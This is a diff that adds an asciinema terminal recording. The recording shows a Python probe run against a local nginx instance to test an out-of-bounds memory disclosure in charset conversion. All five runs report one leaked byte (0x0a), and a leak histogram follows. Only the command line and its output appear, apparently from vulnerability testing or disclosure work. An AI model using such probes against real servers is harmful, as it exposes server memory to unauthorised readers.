@@ -1,0 +1,13 @@
+{"version":3,"term":{"cols":132,"rows":34},"timestamp":1779229009,"idle_time_limit":1.0,"command":"python3 tools/charset_oob_probe.py 127.0.0.1:19321 --runs 5 --mode euro3 --tail 58 --framing chunked --delay 0.03","title":"NGINX charset OOB disclosure probe","env":{"SHELL":"/opt/homebrew/bin/fish"}}
+[0.038, "o", "target        127.0.0.1:19321\r\nprobe path    /charset/ via source_charset=utf-8 -> charset=windows-1251\r\nmode          euro3\r\nframing       chunked\r\nruns          5\r\n\r\n"]
+[0.142, "o", "[001] HTTP/1.1 200 OK\r\n      body len   3\r\n      body hex   88 0a 58\r\n      body text  .\r\nX"]
+[0.001, "o", "\r\n      verdict    visible byte before next upstream buffer\r\n      leak hex   0a\r\n\r\n"]
+[0.140, "o", "[002] HTTP/1.1 200 OK\r\n      body len   3\r\n      body hex   88 0a 58\r\n      body text  .\r\nX"]
+[0.000, "o", "\r\n      verdict    visible byte before next upstream buffer\r\n      leak hex   0a\r\n\r\n"]
+[0.142, "o", "[003] HTTP/1.1 200 OK\r\n      body len   3\r\n      body hex   88 0a 58\r\n      body text  .\r\nX\r\n"]
+[0.000, "o", "      verdict    visible byte before next upstream buffer\r\n      leak hex   0a\r\n\r\n"]
+[0.134, "o", "[004] HTTP/1.1 200 OK\r\n      body len   3\r\n      body hex   88 0a 58\r\n      body text  .\r\nX\r\n      verdict    visible byte before next upstream buffer\r\n"]
+[0.000, "o", "      leak hex   0a\r\n\r\n"]
+[0.139, "o", "[005] HTTP/1.1 200 OK\r\n      body len   3\r\n      body hex   88 0a 58\r\n      body text  .\r\nX\r\n      verdict    visible byte before next upstream buffer\r\n      leak hex   0a\r\n\r\n"]
+[0.000, "o", "leak histogram\r\n     5  0a\r\n"]
+[0.009, "x", "0"]
